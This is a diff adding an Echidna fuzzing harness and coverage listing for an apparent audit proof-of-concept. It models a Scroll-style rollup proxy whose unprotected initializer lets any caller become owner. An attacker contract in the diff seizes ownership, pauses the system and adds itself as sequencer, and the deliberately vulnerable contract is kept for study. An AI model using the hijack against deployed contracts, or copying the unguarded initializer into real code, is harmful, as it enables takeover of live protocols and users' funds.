@@ -1,0 +1,171 @@
+C:/Users/vboxuser/Desktop/Repos/zklibreports/proof_harness/cat2_scroll_f1_scrollchain_init_hijack/src/EchidnaScrollF1ScrollChainInitHijackHarness.sol
+  1 |     | // SPDX-License-Identifier: MIT
+  2 |     | pragma solidity 0.8.24;
+  3 |     | 
+  4 |     | import {
+  5 |     |     ScrollF1SimpleProxy,
+  6 |     |     ScrollChainLike,
+  7 |     |     ScrollChainInitAttacker,
+  8 |     |     IScrollChainLike
+  9 |     | } from "./ScrollF1ScrollChainInitHijackHarness.sol";
+ 10 |     | 
+ 11 |     | /// @notice Echidna harness for ScrollChain initializer takeover.
+ 12 | *r  | contract EchidnaScrollF1ScrollChainInitHijackHarness {
+ 13 |     |     ScrollF1SimpleProxy public proxy;
+ 14 |     |     IScrollChainLike public rollup;
+ 15 |     |     ScrollChainInitAttacker public attacker;
+ 16 |     | 
+ 17 |     |     address public attackerOwner;
+ 18 |     | 
+ 19 | *   |     constructor() {
+ 20 | *   |         ScrollChainLike implementation = new ScrollChainLike();
+ 21 | *   |         proxy = new ScrollF1SimpleProxy(address(this));
+ 22 | *   |         proxy.upgradeTo(address(implementation));
+ 23 | *   |         rollup = IScrollChainLike(address(proxy));
+ 24 | *   |         attacker = new ScrollChainInitAttacker();
+ 25 | *   |         attackerOwner = address(attacker);
+ 26 |     |     }
+ 27 |     | 
+ 28 | *   |     function action_attacker_initialize() public {
+ 29 | *   |         try attacker.hijack(address(proxy), address(0x1111), address(0x2222), 100) {} catch {}
+ 30 |     |     }
+ 31 |     | 
+ 32 |     |     function echidna_non_admin_cannot_take_scrollchain_owner() public view returns (bool) {
+ 33 |     |         return rollup.owner() != attackerOwner;
+ 34 |     |     }
+ 35 |     | }
+ 36 |     | 
+
+C:/Users/vboxuser/Desktop/Repos/zklibreports/proof_harness/cat2_scroll_f1_scrollchain_init_hijack/src/ScrollF1ScrollChainInitHijackHarness.sol
+   1 |     | // SPDX-License-Identifier: MIT
+   2 |     | pragma solidity 0.8.24;
+   3 |     | 
+   4 |     | interface IScrollChainLike {
+   5 |     |     function initialize(address messageQueue, address verifier, uint256 maxNumTxInChunk) external;
+   6 |     |     function owner() external view returns (address);
+   7 |     |     function setPause(bool status) external;
+   8 |     |     function paused() external view returns (bool);
+   9 |     |     function addSequencer(address account) external;
+  10 |     |     function isSequencer(address account) external view returns (bool);
+  11 |     | }
+  12 |     | 
+  13 |     | /// @notice Minimal transparent proxy used for exploit parity.
+  14 | *   | contract ScrollF1SimpleProxy {
+  15 | *   |     bytes32 private constant IMPLEMENTATION_SLOT = bytes32(uint256(keccak256("scroll.f1.proxy.implementation")) - 1);
+  16 | *   |     bytes32 private constant ADMIN_SLOT = bytes32(uint256(keccak256("scroll.f1.proxy.admin")) - 1);
+  17 |     | 
+  18 |     |     error Unauthorized();
+  19 |     |     error ImplementationNotSet();
+  20 |     | 
+  21 | *   |     constructor(address admin_) {
+  22 | *   |         bytes32 adminSlot = ADMIN_SLOT;
+  23 | *   |         assembly {
+  24 | *   |             sstore(adminSlot, admin_)
+  25 |     |         }
+  26 |     |     }
+  27 |     | 
+  28 | *   |     function admin() public view returns (address admin_) {
+  29 | *   |         bytes32 adminSlot = ADMIN_SLOT;
+  30 | *   |         assembly {
+  31 | *   |             admin_ := sload(adminSlot)
+  32 |     |         }
+  33 |     |     }
+  34 |     | 
+  35 | *   |     function implementation() public view returns (address implementation_) {
+  36 | *   |         bytes32 implementationSlot = IMPLEMENTATION_SLOT;
+  37 | *   |         assembly {
+  38 | *   |             implementation_ := sload(implementationSlot)
+  39 |     |         }
+  40 |     |     }
+  41 |     | 
+  42 | *   |     function upgradeTo(address implementation_) external {
+  43 | *   |         if (msg.sender != admin()) revert Unauthorized();
+  44 | *   |         bytes32 implementationSlot = IMPLEMENTATION_SLOT;
+  45 | *   |         assembly {
+  46 | *   |             sstore(implementationSlot, implementation_)
+  47 |     |         }
+  48 |     |     }
+  49 |     | 
+  50 |     |     fallback() external payable {
+  51 | *   |         _delegate();
+  52 |     |     }
+  53 |     | 
+  54 |     |     receive() external payable {}
+  55 |     | 
+  56 | *   |     function _delegate() internal {
+  57 | *   |         address impl = implementation();
+  58 | *   |         if (impl == address(0)) revert ImplementationNotSet();
+  59 |     |         assembly {
+  60 | *   |             calldatacopy(0, 0, calldatasize())
+  61 | *   |             let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
+  62 | *   |             returndatacopy(0, 0, returndatasize())
+  63 | *   |             switch result
+  64 | *   |             case 0 { revert(0, returndatasize()) }
+  65 | *   |             default { return(0, returndatasize()) }
+  66 |     |         }
+  67 |     |     }
+  68 |     | }
+  69 |     | 
+  70 |     | /// @notice ScrollChain-like model preserving the bug:
+  71 |     | ///         external initializer has no caller authorization and sets owner to msg.sender.
+  72 | *   | contract ScrollChainLike {
+  73 |     |     bool internal initialized;
+  74 |     |     address internal _owner;
+  75 |     |     bool internal _paused;
+  76 |     |     mapping(address => bool) internal _sequencer;
+  77 |     | 
+  78 |     |     error AlreadyInitialized();
+  79 |     |     error Unauthorized();
+  80 |     |     error ZeroAddress();
+  81 |     | 
+  82 | *   |     constructor() {
+  83 |     |         // Bug parity with _disableInitializers() on implementation deployment.
+  84 | *   |         initialized = true;
+  85 |     |     }
+  86 |     | 
+  87 | *   |     function initialize(address, address verifier, uint256) external {
+  88 | *   |         if (initialized) revert AlreadyInitialized();
+  89 | *   |         if (verifier == address(0)) revert ZeroAddress();
+  90 | *   |         initialized = true;
+  91 | *   |         _owner = msg.sender;
+  92 |     |     }
+  93 |     | 
+  94 |     |     function owner() external view returns (address) {
+  95 |     |         return _owner;
+  96 |     |     }
+  97 |     | 
+  98 |     |     function paused() external view returns (bool) {
+  99 |     |         return _paused;
+ 100 |     |     }
+ 101 |     | 
+ 102 |     |     function isSequencer(address account) external view returns (bool) {
+ 103 |     |         return _sequencer[account];
+ 104 |     |     }
+ 105 |     | 
+ 106 |     |     function setPause(bool status) external {
+ 107 |     |         if (msg.sender != _owner) revert Unauthorized();
+ 108 |     |         _paused = status;
+ 109 |     |     }
+ 110 |     | 
+ 111 |     |     function addSequencer(address account) external {
+ 112 |     |         if (msg.sender != _owner) revert Unauthorized();
+ 113 |     |         _sequencer[account] = true;
+ 114 |     |     }
+ 115 |     | }
+ 116 |     | 
+ 117 | *   | contract ScrollChainInitAttacker {
+ 118 | *   |     function hijack(address proxy, address messageQueue, address verifier, uint256 maxNumTxInChunk) external {
+ 119 | *   |         IScrollChainLike(proxy).initialize(messageQueue, verifier, maxNumTxInChunk);
+ 120 |     |     }
+ 121 |     | 
+ 122 |     |     function pauseSystem(address proxy) external {
+ 123 |     |         IScrollChainLike(proxy).setPause(true);
+ 124 |     |     }
+ 125 |     | 
+ 126 |     |     function addSelfSequencer(address proxy, address attacker) external {
+ 127 |     |         IScrollChainLike(proxy).addSequencer(attacker);
+ 128 |     |     }
+ 129 |     | }
+ 130 |     | 
+ 131 |     | 
+
